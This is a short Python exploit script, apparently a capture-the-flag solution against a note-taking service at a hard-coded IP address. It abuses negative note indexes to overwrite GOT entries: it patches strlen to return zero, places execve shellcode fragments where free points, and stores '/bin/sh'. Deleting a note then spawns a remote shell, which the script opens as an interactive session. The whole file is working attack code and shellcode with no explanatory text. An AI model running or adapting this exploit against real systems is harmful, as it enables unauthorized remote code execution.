import struct
import socket
import telnetlib

def tcp_connect(ip, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((ip, port))

	return s

def recv_until(s, string):
	received = ""

	while string not in received:
		received += s.recv(1)

	return received

def telnet_interact(s):
	t = telnetlib.Telnet()
	t.sock = s
	t.interact()

def add_note(note_index, number_of_note, content):
	recv_until(s, "Your choice: ")
	s.send("1\n")
	recv_until(s, "Index: ")
	s.send(str(note_index) + "\n")
	recv_until(s, "Number of Note: ")
	s.send(str(number_of_note) + "\n")
	recv_until(s, "Content: ")
	s.send(content + "\n")

def del_note(note_index):
	recv_until(s, "Your choice: ")
	s.send("2\n")
	recv_until(s, "Index: ")
	s.send(str(note_index) + "\n")

s = tcp_connect("159.89.197.67", 3333)

strlen_overwrite = ""
strlen_overwrite += "\x31\xC0" #xor eax, eax
strlen_overwrite += "\xC3" #ret

#make strlen return 0

add_note(-23, 1, strlen_overwrite)

#overwrite free got entry

add_note(-25, 1, "\x31\xF6\x31\xD2\x6A\x3B\xeb\x18")
add_note(1, 1, "\x58\x0F\x05")
add_note(1, 1, "/bin/sh")

del_note(1)

telnet_interact(s)